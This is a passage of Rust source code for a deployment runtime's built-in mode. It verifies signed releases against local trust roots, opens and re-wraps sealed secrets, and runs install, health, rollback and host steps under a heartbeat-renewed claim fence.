//! Built-in mode of the environment runtime (ADR 0048).
//!
//! A runtime in built-in mode applies a claimed step itself, with Tenkai's own
//! executors, instead of handing it to an operator program. Before anything
//! runs it verifies the release the server sent: the signature against trust
//! roots installed on this host, the manifest against the plan step, and the
//! deploy inputs against the signed artifact digest. Only then does the
//! release land in a content-addressed workdir.

use std::future::Future;
use std::path::{Component, Path, PathBuf};
use std::pin::Pin;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use anyhow::{Context as _, Result, anyhow, bail};
use base64::Engine as _;

use crate::fenced_mutation::{MutationCommand, MutationFence};
use crate::host_executor::step::{HOST_NOT_RESTORED, HostStepEnd, SpooledRelease};
use crate::manifest::{self, Manifest};
use crate::plan::{Action, HostStep, Plan, RewrapStep, SealedStep, Step};
use crate::plan_approval::ApprovalEnvelope;
use crate::release_signing::TrustRoots;
use crate::runtime_agent::RuntimeClient;
use crate::runtime_delivery::{RuntimeRelease, RuntimeSealedValue, RuntimeStepReceipt};
use crate::sealed_secret::{SealedOpener, SealedTarget, SecretRef};
use crate::software_executor::{
    OpenedSecret, SoftwareApplyRequest, SoftwareDeployPhase, SoftwareExecutor,
    SoftwareExecutorKind, SoftwareExecutors, format_software_phase_error, rollback_channel_note,
    sanitize_diagnostic_text,
};

/// The value of `TENKAI_RUNTIME_EXECUTOR` that selects built-in mode.
pub const BUILTIN: &str = "builtin";

/// What a runtime in built-in mode needs from its own host. Nothing here
/// comes from the server.
pub struct BuiltinConfig {
    pub executors: SoftwareExecutors,
    /// Release signers this runtime trusts, installed on this host.
    pub release_roots: TrustRoots,
    /// Cluster configuration file the Kubernetes executors use. Without it,
    /// a Kubernetes release is refused rather than sent to an ambient one.
    pub cluster_config: Option<PathBuf>,
    /// Directory of Docker env files.
    pub secret_dir: Option<PathBuf>,
    /// Where this runtime's file sealing key lives, when it enrolled with a
    /// credential file. Without one, sealed steps are refused.
    pub sealing_dir: Option<PathBuf>,
    /// Where verified releases are placed, one directory per environment.
    pub work_root: PathBuf,
}

/// Load release-signing trust roots from `path`. The file and its directory
/// must be owned by this user and not writable by anyone else.
pub fn load_release_roots(path: &Path) -> Result<TrustRoots> {
    let raw = crate::runtime_local_approval::read_owner_only(path)?;
    let roots: TrustRoots =
        toml::from_str(&raw).with_context(|| format!("parsing {}", path.display()))?;
    roots
        .validate()
        .with_context(|| format!("validating {}", path.display()))?;
    Ok(roots)
}

/// Run `step` of plan `plan_id` with a built-in executor while the claim at
/// `generation` holds, as the server applies a step: a rollback first removes
/// the outgoing release; the executor or the shell `deploy.install` runs, then
/// `deploy.health`. A failed restart re-applies the current pin. A failed
/// activation runs failed-apply cleanup when the release declares
/// `deploy.uninstall`, then restores the release the step replaced.
///
/// A host step instead goes to this host's applier once, with `approvals`,
/// and is never cleaned up or restored ([`Run::host`]).
///
/// A failed step is a receipt. `Err` means the claim was fenced or its state
/// is unknown: nothing is reported, and the plan is retried under a later
/// claim.
pub(crate) async fn execute_step(
    client: &RuntimeClient,
    config: &Arc<BuiltinConfig>,
    plan: &Plan,
    generation: u64,
    step: &Step,
    approvals: &[ApprovalEnvelope],
) -> Result<RuntimeStepReceipt> {
    let plan_id = plan.id.as_str();
    let receipt = |result: Result<(), String>| RuntimeStepReceipt {
        step_id: step.id.clone(),
        succeeded: result.is_ok(),
        detail: result
            .err()
            .unwrap_or_else(|| "built-in executor completed successfully".into()),
        wraps: Vec::new(),
    };
    let run = Run {
        client,
        config,
        plan_id,
        generation,
    };
    if let Some(host) = step.host {
        return Ok(receipt(run.host(plan, step, host, approvals).await?));
    }
    if let Some(rewrap) = &step.rewrap {
        return run.rewrap(step, rewrap).await;
    }
    let target = match run.prepare(step, false).await? {
        Ok(target) => target,
        Err(detail) => return Ok(receipt(Err(detail))),
    };
    let restart = step.action == Action::Restart;
    // Like the server, everything is verified before anything mutates.
    let restore = match step.from.as_deref().filter(|_| !restart) {
        Some(_) if step.restore.is_some() => match run.prepare(step, true).await? {
            Ok(restore) => Some(restore),
            Err(detail) => return Ok(receipt(Err(detail))),
        },
        _ => None,
    };
    // A product keeps one executor (ADR 0041), read from the restore pin or,
    // without one, from what the server says the step replaces.
    let installed = match &restore {
        Some(restore) => Some(restore.manifest.deploy.executor),
        None => target.replaced_executor,
    };
    if let Some(installed) = installed
        && let Err(error) = config.executors.require_same_executor(
            &step.product,
            installed,
            target.manifest.deploy.executor,
        )
    {
        return Ok(receipt(Err(format!("{error:#}"))));
    }
    // A missing target is refused before anything mutates: nothing to
    // clean up or restore.
    if let Some(executor) = &target.executor
        && let Err(error) = executor.require_target(&target.request)
    {
        return Ok(receipt(Err(
            target.phase_error(SoftwareDeployPhase::Apply, &error.to_string())
        )));
    }

    if step.action == Action::Rollback
        && let Some(outgoing) = &restore
        && outgoing
            .manifest
            .deploy
            .uninstall
            .as_deref()
            .is_some_and(|command| !command.is_empty())
        && let Err(detail) = run.remove(outgoing, false).await?
    {
        return Ok(receipt(Err(format!(
            "rollback blocked: outgoing release cleanup failed: {detail}"
        ))));
    }
    let Err(failure) = run.apply(&target, restart).await? else {
        return Ok(receipt(Ok(())));
    };
    if restart {
        let reapplied = run.apply(&target, false).await?.is_ok();
        return Ok(receipt(Err(if reapplied {
            format!("{failure}; current pin remains deployed")
        } else {
            format!("{failure}; re-apply of the current pin also failed")
        })));
    }
    let failure = match target.manifest.deploy.uninstall {
        Some(_) => match run.remove(&target, true).await? {
            Ok(()) => format!("{failure}; cleaned up failed install"),
            Err(cleanup) => format!("{failure}; cleanup also failed: {cleanup}"),
        },
        None => failure,
    };
    let Some(previous) = step.from.as_deref() else {
        return Ok(receipt(Err(failure)));
    };
    let Some(restore) = restore else {
        return Ok(receipt(Err(format!(
            "{failure}; step {} has no pinned restore release",
            step.id
        ))));
    };
    let note = rollback_channel_note(&step.product, previous);
    Ok(receipt(Err(match run.apply(&restore, false).await? {
        Ok(()) => format!("{failure}; restored {previous}; {note}"),
        Err(detail) => {
            let detail = restore.phase_error(SoftwareDeployPhase::Restore, &detail);
            format!(
                "{failure}; restore or health check of {previous} also failed: {detail}; {note}"
            )
        }
    })))
}

/// A release verified and placed here, with the executor it runs with.
struct Prepared {
    manifest: Manifest,
    /// The manifest text exactly as signed, and its signature.
    raw_manifest: String,
    signature: crate::release_signing::SignatureEnvelope,
    request: SoftwareApplyRequest,
    /// The signed digest the placed inputs hash to.
    artifact_digest: String,
    /// See [`VerifiedRelease::replaced_executor`].
    replaced_executor: Option<Option<SoftwareExecutorKind>>,
    /// See [`VerifiedRelease::sealed`].
    sealed: Vec<RuntimeSealedValue>,
    /// `None` is the shell `deploy.install` path.
    executor: Option<Arc<dyn SoftwareExecutor>>,
}

impl Prepared {
    /// Whether a shell command left the signed deploy inputs as placed, as
    /// the server checks after one.
    fn intact(&self) -> Result<(), String> {
        let digest = manifest::identity_digest(
            &self.request.workdir,
            &self.manifest.immutable_inputs(),
            &self.manifest.artifacts,
        );
        match digest {
            Ok(digest) if digest == self.artifact_digest => Ok(()),
            _ => Err("immutable deployment inputs changed while executing release".into()),
        }
    }

    fn phase_error(&self, phase: SoftwareDeployPhase, detail: &str) -> String {
        format_software_phase_error(
            phase,
            &self.request.product,
            &self.request.version,
            &self.request.environment,
            detail,
        )
    }
}

/// One claimed step's context on this runtime.
struct Run<'a> {
    client: &'a RuntimeClient,
    config: &'a Arc<BuiltinConfig>,
    plan_id: &'a str,
    generation: u64,
}

impl Run<'_> {
    /// Fetch, verify and place the step's target, or with `restore` its
    /// restore pin. The inner `Err` is the reason for the step's receipt.
    async fn prepare(&self, step: &Step, restore: bool) -> Result<Result<Prepared, String>> {
        let release = match self
            .client
            .fetch_release(self.plan_id, self.generation, step, restore)
            .await?
        {
            Ok(release) => release,
            Err(detail) => return Ok(Err(detail)),
        };
        let verified = tokio::task::spawn_blocking({
            let config = self.config.clone();
            let environment = self.client.environment().to_owned();
            let step = step.clone();
            move || {
                let expected = if restore {
                    Expected::restore(&step).with_context(|| {
                        format!("step {} has no pinned restore release", step.id)
                    })?
                } else {
                    Expected::target(&step)
                };
                let verified = config.verify(release, &environment, &expected)?;
                config.admit_executor(
                    &verified.manifest,
                    !step.sealed.is_empty(),
                    step.host.is_some() && !restore,
                )?;
                Ok::<_, anyhow::Error>(verified)
            }
        })
        .await?;
        let refused =
            |error: anyhow::Error| Ok(Err(sanitize_diagnostic_text(&format!("{error:#}"))));
        let VerifiedRelease {
            manifest,
            raw_manifest,
            signature,
            request,
            artifact_digest,
            replaced_executor,
            sealed,
        } = match verified {
            Ok(verified) => verified,
            Err(error) => return refused(error),
        };
        // A host release runs through the applier, not an executor.
        let executor = if manifest.deploy.executor == Some(SoftwareExecutorKind::Host) {
            None
        } else {
            match self.config.executors.resolve(manifest.deploy.executor) {
                Ok(executor) => executor,
                Err(error) => return refused(error),
            }
        };
        Ok(Ok(Prepared {
            manifest,
            raw_manifest,
            signature,
            request,
            artifact_digest,
            replaced_executor,
            sealed,
            executor,
        }))
    }

    /// The fence of a shell mutation, and the command it runs for `release`.
    fn shell<'a>(
        &'a self,
        lock: &'a Path,
        release: &'a Prepared,
        command: &'a str,
    ) -> (ClaimFence<'a>, MutationCommand<'a>) {
        (
            ClaimFence {
                client: self.client,
                plan_id: self.plan_id,
                generation: self.generation,
            },
            MutationCommand {
                lock_path: lock,
                workdir: &release.request.workdir,
                environment: &release.request.environment,
                product: &release.request.product,
                instance: &release.request.instance,
                command,
            },
        )
    }

    /// Run host `step` once through this host's applier (ADR 0048 §2): the
    /// request is the claimed plan, the verified signed release, and the
    /// plan's approvals, which the applier verifies itself against its own
    /// trust and records. [`fence_host_units`] ran when the plan was claimed.
    /// A failed host step is never cleaned up, re-applied, or restored.
    async fn host(
        &self,
        plan: &Plan,
        step: &Step,
        host: HostStep,
        approvals: &[ApprovalEnvelope],
    ) -> Result<Result<(), String>> {
        let target = match self.prepare(step, false).await? {
            Ok(target) => target,
            Err(detail) => return Ok(Err(detail)),
        };
        let did_not_run = |detail: String| {
            Err(format!(
                "host {} of {} {} did not run: {detail}",
                host.action, step.product, step.to
            ))
        };
        if target.manifest.deploy.executor != Some(SoftwareExecutorKind::Host) {
            return Ok(did_not_run(format!(
                "step {} is a host step, and {} is not a host release",
                step.id, step.release_id
            )));
        }
        let applier = match self.config.executors.host() {
            Ok(applier) => applier,
            Err(error) => return Ok(did_not_run(format!("{error:#}"))),
        };
        let request = match crate::host_apply::HostApplyRequest::new(
            plan,
            &step.id,
            host.action,
            &target.raw_manifest,
            target.signature.clone(),
            approvals,
        ) {
            Ok(request) => request,
            Err(error) => return Ok(did_not_run(format!("{error:#}"))),
        };
        let mut fence = ClaimFence {
            client: self.client,
            plan_id: self.plan_id,
            generation: self.generation,
        };
        let environment = self.client.environment();
        let inputs = target.manifest.immutable_inputs();
        let dependency_document = &target.request.dependency_document;
        // The opened values go to the applier with the ciphertexts they were
        // opened from, which it binds to the approved step.
        let sealed = (!target.request.opened_secrets.is_empty()).then(|| {
            crate::host_apply::sealed::HostSealedValues::new(
                target
                    .request
                    .opened_secrets
                    .iter()
                    .zip(&target.sealed)
                    .map(
                        |(opened, delivered)| crate::host_apply::sealed::HostSealedValue {
                            secret: opened.secret.clone(),
                            key: opened.key.clone(),
                            ciphertext: delivered.sealed.ciphertext.clone(),
                            value: zeroize::Zeroizing::new(
                                base64::engine::general_purpose::STANDARD.encode(&*opened.value),
                            ),
                        },
                    )
                    .collect(),
            )
        });
        let ended = crate::host_executor::step::run(
            &mut fence,
            applier,
            &request,
            &SpooledRelease {
                environment,
                product: &step.product,
                release_digest: &step.release_digest,
                root: &target.request.workdir,
                inputs: &inputs,
                artifact_digest: &target.artifact_digest,
                dependency_document: (!dependency_document.is_empty())
                    .then_some(dependency_document.as_str()),
                sealed: sealed.as_ref(),
            },
        )
        .await?;
        Ok(host_outcome(step, host, ended))
    }

    /// Re-wrap every sealed value `step` names for its recipient (ADR 0045
    /// §5). Nothing is deployed, so the release is neither verified nor
    /// placed: only its sealed values are used, each checked against the
    /// approved step before it is opened. The wraps go back on the receipt.
    async fn rewrap(&self, step: &Step, rewrap: &RewrapStep) -> Result<RuntimeStepReceipt> {
        let failed = |detail: String| RuntimeStepReceipt {
            step_id: step.id.clone(),
            succeeded: false,
            detail,
            wraps: Vec::new(),
        };
        let release = match self
            .client
            .fetch_release(self.plan_id, self.generation, step, false)
            .await?
        {
            Ok(release) => release,
            Err(detail) => return Ok(failed(detail)),
        };
        let wrapped = tokio::task::spawn_blocking({
            let config = self.config.clone();
            let environment = self.client.environment().to_owned();
            let step = step.clone();
            let rewrap = rewrap.clone();
            move || config.rewrap_sealed(&release, &environment, &step, &rewrap)
        })
        .await?;
        Ok(match wrapped {
            Ok(wraps) => RuntimeStepReceipt {
                step_id: step.id.clone(),
                succeeded: true,
                detail: format!(
                    "re-wrapped {} sealed values for {}",
                    wraps.len(),
                    rewrap.fingerprint
                ),
                wraps,
            },
            Err(error) => failed(sanitize_diagnostic_text(&format!(
                "re-wrapping for {} failed: {error:#}",
                rewrap.fingerprint
            ))),
        })
    }

    fn lock(&self, release: &Prepared) -> PathBuf {
        self.config
            .work_root
            .join(&release.request.environment)
            .join(".mutation.lock")
    }

    /// Apply `release` (or restart it) and run its health check.
    async fn apply(&self, release: &Prepared, restart: bool) -> Result<Result<(), String>> {
        let lock = self.lock(release);
        let request = &release.request;
        let applied = match &release.executor {
            Some(executor) => {
                if let Err(error) = executor.require_target(request) {
                    return Ok(Err(
                        release.phase_error(SoftwareDeployPhase::Apply, &error.to_string())
                    ));
                }
                if !request.artifact_pulls.is_empty()
                    && !executor.consumes_admitted_artifact_pulls()
                {
                    return Ok(Err(
                        "executor does not consume admitted environment-mirror artifact pulls"
                            .into(),
                    ));
                }
                let phase = if restart {
                    SoftwareDeployPhase::Restart
                } else {
                    SoftwareDeployPhase::Apply
                };
                run_claimed(self.client, self.plan_id, self.generation, {
                    let executor = executor.clone();
                    let request = request.clone();
                    move |stop| {
                        if restart {
                            executor.restart_until_stopped(&request, stop)
                        } else {
                            executor.apply_until_stopped(&request, stop)
                        }
                    }
                })
                .await?
                .map_err(|error| release.phase_error(phase, &format!("{error:#}")))
            }
            None if !request.artifact_pulls.is_empty() => {
                return Ok(Err(
                    "digest-bound artifacts require an executor that consumes admitted environment-mirror pulls"
                        .into(),
                ));
            }
            None => {
                let (mut fence, command) =
                    self.shell(&lock, release, &release.manifest.deploy.install);
                crate::fenced_mutation::run(&mut fence, command).await?
            }
        };
        match (applied, release.manifest.deploy.health.as_deref()) {
            (Ok(()), Some(health)) if !health.is_empty() => {
                let (mut fence, command) = self.shell(&lock, release, health);
                Ok(crate::fenced_mutation::run(&mut fence, command)
                    .await?
                    .map_err(|error| match release.executor {
                        Some(_) => release.phase_error(SoftwareDeployPhase::Health, &error),
                        None => error,
                    }))
            }
            (applied, _) => Ok(applied),
        }
        .map(|applied| match release.executor {
            // After install and health, as the server checks.
            None => applied.and_then(|()| release.intact()),
            Some(_) => applied,
        })
    }

    /// Remove `release`: with `failed_apply`, only what its failed apply
    /// left behind.
    async fn remove(&self, release: &Prepared, failed_apply: bool) -> Result<Result<(), String>> {
        let lock = self.lock(release);
        match &release.executor {
            Some(executor) => {
                if !self.client.heartbeat(self.plan_id, self.generation).await? {
                    bail!("runtime claim was fenced");
                }
                // Removal cannot be stopped part-way; the claim is still
                // renewed while it runs, and a lost claim is reported after.
                Ok(run_claimed(self.client, self.plan_id, self.generation, {
                    let executor = executor.clone();
                    let request = release.request.clone();
                    move |_stop| {
                        if failed_apply {
                            executor.cleanup_failed_apply(&request)
                        } else {
                            executor.remove(&request)
                        }
                    }
                })
                .await?
                .map_err(|error| {
                    release.phase_error(SoftwareDeployPhase::Remove, &error.to_string())
                }))
            }
            None => match release.manifest.deploy.uninstall.as_deref() {
                Some(uninstall) if !uninstall.is_empty() => {
                    let (mut fence, command) = self.shell(&lock, release, uninstall);
                    Ok(crate::fenced_mutation::run(&mut fence, command)
                        .await?
                        .and_then(|()| release.intact()))
                }
                _ => Ok(Err("release has no uninstall command".into())),
            },
        }
    }
}

/// Stop every host unit an earlier holder of this environment's claim left
/// running, before any step of the plan claimed at `generation` runs, as the
/// server does when it claims the environment lease, then remove the sealed
/// values an earlier attempt spooled for this environment. Nothing to do
/// without a host applier.
/// `Err` means the claim was fenced or a unit would not stop.
pub(crate) async fn fence_host_units(
    client: &RuntimeClient,
    config: &BuiltinConfig,
    plan_id: &str,
    generation: u64,
) -> Result<()> {
    let Ok(host) = config.executors.host() else {
        return Ok(());
    };
    crate::host_executor::step::fence_environment(
        &mut ClaimFence {
            client,
            plan_id,
            generation,
        },
        host,
        client.environment(),
    )
    .await?;
    host.discard_sealed(client.environment()).await
}

/// A host step's receipt from how it ended: only a recorded success
/// succeeds.
fn host_outcome(step: &Step, host: HostStep, ended: HostStepEnd) -> Result<(), String> {
    let what = format!("host {} of {} {}", host.action, step.product, step.to);
    match ended {
        HostStepEnd::Recorded(result) if result.outcome.succeeded() => Ok(()),
        HostStepEnd::Recorded(result) => Err(format!(
            "{what} ended {:?}: {}; {HOST_NOT_RESTORED}",
            result.outcome, result.detail
        )),
        HostStepEnd::Unknown(detail) => {
            Err(format!("{what} failed: {detail}; {HOST_NOT_RESTORED}"))
        }
        HostStepEnd::NotRun(detail) => Err(format!("{what} did not run: {detail}")),
    }
}

/// Run a blocking executor call while renewing the claim every 30 seconds.
/// Once the claim is fenced, or its renewal outcome is unknown, `work` is
/// asked to stop and the outer `Err` reports why.
async fn run_claimed<T: Send + 'static>(
    client: &RuntimeClient,
    plan_id: &str,
    generation: u64,
    work: impl FnOnce(&AtomicBool) -> Result<T> + Send + 'static,
) -> Result<Result<T>> {
    /// Stops the work when this future is dropped: it must not run unfenced.
    struct StopOnDrop(Arc<AtomicBool>);
    impl Drop for StopOnDrop {
        fn drop(&mut self) {
            self.0.store(true, Ordering::SeqCst);
        }
    }
    let stop = Arc::new(AtomicBool::new(false));
    let _stop_on_drop = StopOnDrop(stop.clone());
    let mut running = tokio::task::spawn_blocking({
        let stop = stop.clone();
        move || work(&stop)
    });
    let mut renew = tokio::time::interval(Duration::from_secs(30));
    renew.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    renew.tick().await;
    let mut lost = None;
    let finished = loop {
        tokio::select! {
            joined = &mut running => break joined,
            _ = renew.tick(), if lost.is_none() => {
                let error = match client.heartbeat(plan_id, generation).await {
                    Ok(true) => continue,
                    Ok(false) => anyhow!("runtime claim was fenced"),
                    Err(error) => error.context("runtime heartbeat outcome is ambiguous"),
                };
                stop.store(true, Ordering::SeqCst);
                lost = Some(error);
            }
        }
    };
    let finished = finished.context("built-in executor task failed")?;
    match lost {
        Some(error) => Err(error),
        None => Ok(finished),
    }
}

/// The claim as the fence of a shell mutation: refreshing renews it.
struct ClaimFence<'a> {
    client: &'a RuntimeClient,
    plan_id: &'a str,
    generation: u64,
}

impl MutationFence for ClaimFence<'_> {
    fn generation(&self) -> u64 {
        self.generation
    }

    fn refresh(&mut self) -> Pin<Box<dyn Future<Output = Result<()>> + Send + '_>> {
        Box::pin(async move {
            if !self.client.heartbeat(self.plan_id, self.generation).await? {
                bail!("runtime claim was fenced");
            }
            Ok(())
        })
    }
}

/// What the plan says a release package must be.
pub struct Expected<'a> {
    pub product: &'a str,
    pub instance: &'a str,
    pub version: &'a str,
    pub release_id: &'a str,
    pub release_digest: &'a str,
    pub artifact_digest: &'a str,
    /// The sealed values the step writes. A restore writes the same ones:
    /// they belong to the instance, not the release.
    pub sealed: &'a [SealedStep],
}

impl<'a> Expected<'a> {
    /// The release `step` installs.
    pub fn target(step: &'a Step) -> Self {
        Self {
            product: &step.product,
            instance: step.instance_name(),
            version: &step.to,
            release_id: &step.release_id,
            release_digest: &step.release_digest,
            artifact_digest: &step.artifact_digest,
            sealed: &step.sealed,
        }
    }

    /// The release `step` replaces, from its restore pin. `None` without one.
    pub fn restore(step: &'a Step) -> Option<Self> {
        let (pin, version) = (step.restore.as_ref()?, step.from.as_deref()?);
        Some(Self {
            product: &step.product,
            instance: step.instance_name(),
            version,
            release_id: &pin.release_id,
            release_digest: &pin.digest,
            artifact_digest: &pin.artifact_digest,
            sealed: &step.sealed,
        })
    }
}

/// A release that verified for one plan step, placed in its workdir.
#[derive(Debug)]
pub struct VerifiedRelease {
    pub manifest: Manifest,
    /// The manifest text exactly as signed, and its signature.
    pub raw_manifest: String,
    pub signature: crate::release_signing::SignatureEnvelope,
    /// The server's request with this host's workdir, cluster configuration,
    /// and secret directory filled in.
    pub request: SoftwareApplyRequest,
    /// The signed digest the placed inputs hash to.
    pub artifact_digest: String,
    /// The declared executor of the release the step replaces, when the
    /// server sent it: `Some(None)` declares none.
    pub replaced_executor: Option<Option<SoftwareExecutorKind>>,
    /// The sealed values as delivered, which `request.opened_secrets` was
    /// opened from and matches slot for slot. A host step passes their
    /// ciphertexts to the applier.
    pub sealed: Vec<RuntimeSealedValue>,
}

impl BuiltinConfig {
    /// Verify `release` against what the plan step `expected` names in
    /// `environment`, place its deploy inputs, and return the request to run.
    pub fn verify(
        &self,
        release: RuntimeRelease,
        environment: &str,
        expected: &Expected<'_>,
    ) -> Result<VerifiedRelease> {
        let manifest_digest = manifest::digest(&release.manifest);
        if manifest_digest != expected.release_digest {
            bail!("the release manifest does not match the plan step's release digest");
        }
        let manifest =
            manifest::parse_raw(&release.manifest).context("the release manifest is not valid")?;
        let (name, version) = (&manifest.product.name, &manifest.product.version);
        if expected.product != name
            || expected.version != version
            || expected.release_id != crate::ontology::release_id(name, version)
        {
            bail!(
                "the plan step names {} {}, but the signed manifest is {name} {version}",
                expected.product,
                expected.version
            );
        }
        crate::release_signing::verify_release(
            &release.signature,
            &self.release_roots,
            &manifest_digest,
            expected.artifact_digest,
        )
        .context("verifying the release signature against this runtime's trust roots")?;

        let mut request = release.request;
        if request.product != expected.product
            || request.version != expected.version
            || request.environment != environment
            || request.instance_name() != expected.instance
            || request.release_id != format!("tenkai:release:{name}@{version}")
        {
            bail!("the server's executor request does not match the plan step");
        }
        let pulls = request.artifact_pulls.iter().map(|pull| &pull.digest);
        if request.artifact_pulls.len() != manifest.artifacts.len()
            || !pulls.eq(manifest.artifacts.iter().map(|artifact| &artifact.digest))
        {
            bail!("the admitted artifact pulls do not match the signed manifest's artifacts");
        }

        let inputs = manifest.immutable_inputs();
        let workdir = self.place(
            environment,
            expected.product,
            expected.artifact_digest,
            &inputs,
            &manifest.artifacts,
            &release.entries,
        )?;
        request.workdir = workdir;
        request.cluster_config_path = self.cluster_config.clone();
        request.secret_dir_path = self.secret_dir.clone();
        request.opened_secrets = self.open_sealed(&release.sealed, environment, expected)?;
        request.remove_owned_secrets = true;
        let replaced_executor = match release.replaces {
            None => None,
            Some(replaced) => Some(match replaced.executor {
                None => None,
                Some(name) => Some(
                    SoftwareExecutorKind::from_name(&name)
                        .with_context(|| format!("unknown replaced executor {name:?}"))?,
                ),
            }),
        };
        Ok(VerifiedRelease {
            manifest,
            raw_manifest: release.manifest,
            signature: release.signature,
            sealed: release.sealed,
            request,
            artifact_digest: expected.artifact_digest.to_owned(),
            replaced_executor,
        })
    }

    /// Check the server's sealed values against the plan step, which the
    /// local approval policy covered, and open them with this runtime's own
    /// key (ADR 0045 §4). Errors name the slot, never a value.
    fn open_sealed(
        &self,
        delivered: &[RuntimeSealedValue],
        environment: &str,
        expected: &Expected<'_>,
    ) -> Result<Vec<OpenedSecret>> {
        if expected.sealed.is_empty() && delivered.is_empty() {
            return Ok(Vec::new());
        }
        let slots = delivered.iter().map(|value| (&value.secret, &value.key));
        if !slots.eq(expected.sealed.iter().map(|step| (&step.secret, &step.key))) {
            bail!("the server's sealed values do not match the plan step");
        }
        let dir = self.sealing_dir.as_deref().context(
            "the step writes sealed secrets, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let opener = SealedOpener::load(dir)?;
        expected
            .sealed
            .iter()
            .zip(delivered)
            .map(|(step, value)| {
                let slot = SecretRef::new(&step.secret, &step.key)?;
                let target = SealedTarget::new(environment, expected.instance, slot)?;
                if crate::sealed_secret::digest(&target, &value.sealed)? != step.digest {
                    bail!(
                        "sealed {}/{} does not match the plan step's digest",
                        step.secret,
                        step.key
                    );
                }
                Ok(OpenedSecret {
                    secret: step.secret.clone(),
                    key: step.key.clone(),
                    digest: step.digest.clone(),
                    value: opener.open(&target, &value.sealed)?,
                })
            })
            .collect()
    }

    /// Wrap the data key of every sealed value `step` names for its approved
    /// recipient. The server's recipient key must have the fingerprint the
    /// step names, and each value the slot and digest the step names; only
    /// then is it opened, and only its data key is wrapped again. Errors
    /// name a slot, never a value.
    pub fn rewrap_sealed(
        &self,
        release: &RuntimeRelease,
        environment: &str,
        step: &Step,
        rewrap: &RewrapStep,
    ) -> Result<Vec<crate::sealed_secret::RecipientWrap>> {
        let recipient = crate::sealing_key::SealingPublicKey::from_wire(
            release
                .rewrap_recipient
                .as_deref()
                .context("the server sent no recipient key for the re-wrap step")?,
        )?;
        if recipient.fingerprint() != rewrap.fingerprint {
            bail!(
                "the server sent a recipient key other than the approved {}",
                rewrap.fingerprint
            );
        }
        let slots = release
            .sealed
            .iter()
            .map(|value| (&value.secret, &value.key));
        if step.sealed.is_empty()
            || !slots.eq(step
                .sealed
                .iter()
                .map(|sealed| (&sealed.secret, &sealed.key)))
        {
            bail!("the server's sealed values do not match the re-wrap step");
        }
        let dir = self.sealing_dir.as_deref().context(
            "the step re-wraps sealed values, and this runtime has no sealing key (enroll with --credential-file)",
        )?;
        let opener = SealedOpener::load(dir)?;
        step.sealed
            .iter()
            .zip(&release.sealed)
            .map(|(sealed, value)| {
                let slot = SecretRef::new(&sealed.secret, &sealed.key)?;
                let target = SealedTarget::new(environment, step.instance_name(), slot)?;
                if crate::sealed_secret::digest(&target, &value.sealed)? != sealed.digest {
                    bail!(
                        "sealed {}/{} does not match the re-wrap step's digest",
                        sealed.secret,
                        sealed.key
                    );
                }
                if value.sealed.wraps.len() >= crate::sealed_secret::MAX_WRAPS
                    && !value
                        .sealed
                        .wraps
                        .iter()
                        .any(|wrap| wrap.fingerprint == rewrap.fingerprint)
                {
                    bail!(
                        "sealed {}/{} already has {} recipients; revoke a runtime before adding one",
                        sealed.secret,
                        sealed.key,
                        crate::sealed_secret::MAX_WRAPS
                    );
                }
                // A runtime that lost its wrap opens through the recovered
                // one the approved step carries (ADR 0045 §7). Opening
                // authenticates it, so a wrap for another value fails here.
                let mut value = std::borrow::Cow::Borrowed(&value.sealed);
                let recovered = rewrap.recovered.iter().find(|wrap| {
                    wrap.secret == sealed.secret
                        && wrap.key == sealed.key
                        && wrap.digest == sealed.digest
                        && wrap.wrap.fingerprint == rewrap.fingerprint
                });
                if let Some(recovered) = recovered
                    && opener.fingerprint() == rewrap.fingerprint
                    && !value.wraps.iter().any(|wrap| wrap.fingerprint == rewrap.fingerprint)
                {
                    value.to_mut().wraps.push(recovered.wrap.clone());
                }
                Ok(crate::sealed_secret::RecipientWrap {
                    secret: sealed.secret.clone(),
                    key: sealed.key.clone(),
                    digest: sealed.digest.clone(),
                    wrap: opener.rewrap(&target, &value, &recipient)?,
                })
            })
            .collect()
    }

    /// Refuse a release this runtime must not run with a built-in executor,
    /// naming why. Only Helm and the host applier write sealed values
    /// (ADR 0048 §4). A host
    /// release runs only as a `host_step`, through this host's applier, and
    /// is never restored: anything else would run its commands outside the
    /// applier's approval and generation checks. `Ok` means
    /// [`SoftwareExecutors::resolve`] decides.
    pub fn admit_executor(&self, manifest: &Manifest, sealed: bool, host_step: bool) -> Result<()> {
        if manifest.product.kind.policy().target() != crate::product_kind::ProductTarget::Software {
            bail!("only software releases run on an environment runtime");
        }
        let kind = self.executors.effective_kind(manifest.deploy.executor);
        if (kind == Some(SoftwareExecutorKind::Host)) != host_step {
            bail!(if host_step {
                "the step is a host step, and the release is not a host release"
            } else {
                "a host release runs only as a host step through the host applier"
            });
        }
        match kind {
            Some(SoftwareExecutorKind::Host) => self.executors.host().map(|_| ()).context(
                "this runtime runs host releases only with a host applier (TENKAI_HOST_SPOOL_DIR)",
            ),
            Some(
                SoftwareExecutorKind::Helm
                | SoftwareExecutorKind::Kubernetes
                | SoftwareExecutorKind::KubernetesInProcess,
            ) if self.cluster_config.is_none() => bail!(
                "release declares deploy.executor = \"{}\", and this runtime has no cluster configuration (TENKAI_RUNTIME_CLUSTER_CONFIG)",
                kind.map_or("", SoftwareExecutorKind::as_str)
            ),
            Some(SoftwareExecutorKind::Helm) => Ok(()),
            _ if sealed => bail!(
                "the step writes sealed secrets, and only the helm executor and the host applier write them; this release runs with {}",
                kind.map_or("shell", SoftwareExecutorKind::as_str)
            ),
            _ => Ok(()),
        }
    }

    /// Rebuild the deploy inputs under a staging directory, check them against
    /// the signed artifact digest, and move them to
    /// `<work_root>/<environment>/<product>/<artifact digest>`. A matching
    /// directory left by an earlier attempt is reused. Earlier releases stay:
    /// a running product may still read them, and a rollback reuses them.
    fn place(
        &self,
        environment: &str,
        product: &str,
        artifact_digest: &str,
        inputs: &[String],
        artifacts: &[crate::oci_artifact::OciArtifactRef],
        entries: &[crate::runtime_delivery::RuntimeReleaseEntry],
    ) -> Result<PathBuf> {
        crate::ontology::validate_identifier("environment", environment)?;
        crate::ontology::validate_identifier("product", product)?;
        if artifact_digest.is_empty()
            || !artifact_digest.bytes().all(|byte| byte.is_ascii_hexdigit())
        {
            bail!("the plan step's artifact digest is not a hex digest");
        }
        let product_dir = self.work_root.join(environment).join(product);
        std::fs::create_dir_all(&product_dir)
            .with_context(|| format!("creating {}", product_dir.display()))?;
        let destination = product_dir.join(artifact_digest);
